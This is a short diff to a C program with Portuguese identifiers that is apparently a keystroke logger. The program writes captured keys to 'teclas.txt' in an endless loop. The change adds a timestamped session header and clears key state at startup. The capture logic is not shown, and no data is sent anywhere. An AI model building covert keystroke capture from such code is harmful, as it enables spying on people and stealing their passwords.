@@ -167,12 +167,20 @@ void VerificarTeclas(FILE *arquivo) {
 }
 
 int main() {
+    char linha[100];
+    char horario[30];
+
     InicializarTeclas();
+    LimparEstadoTeclas(); // limpa o estado das teclas para evitar registros errôneos
+    ObterHorario(horario);
 
     FILE *arquivo = fopen("teclas.txt", "a");
     if (arquivo == NULL) return 1;
 
     fprintf(arquivo, "===== NOVA SESSAO =====\n");
+    sprintf(linha, "[%s] Iniciado\n", horario);
+    fputs(linha, arquivo);
+    fprintf(arquivo, "========================\n\n");
     fflush(arquivo);
 
     while(1) {
